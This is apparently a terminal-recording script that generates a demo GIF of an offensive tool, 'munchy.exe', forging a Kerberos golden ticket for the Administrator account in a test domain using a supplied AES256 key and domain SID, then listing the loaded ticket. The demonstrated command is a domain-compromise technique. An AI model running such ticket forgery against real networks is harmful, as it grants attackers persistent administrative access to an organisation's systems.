Output demo.gif

Set FontSize 23
Set Width 1200
Set Height 600
Set Shell powershell

Type "klist purge"

Sleep 1s

Enter

Type "./munchy.exe kerb --domain test.local --gold --user Administrator --aes256 d8bdf0214af12b2ff53205aa682f3f82bd63152510a57c82f483779ef8b64154 --dsid S-1-5-21-247333915-1364033409-3763389934 --spn http/testserver"

Sleep 1s

Enter

Type "klist"

Sleep 1s

Enter

Sleep 4s
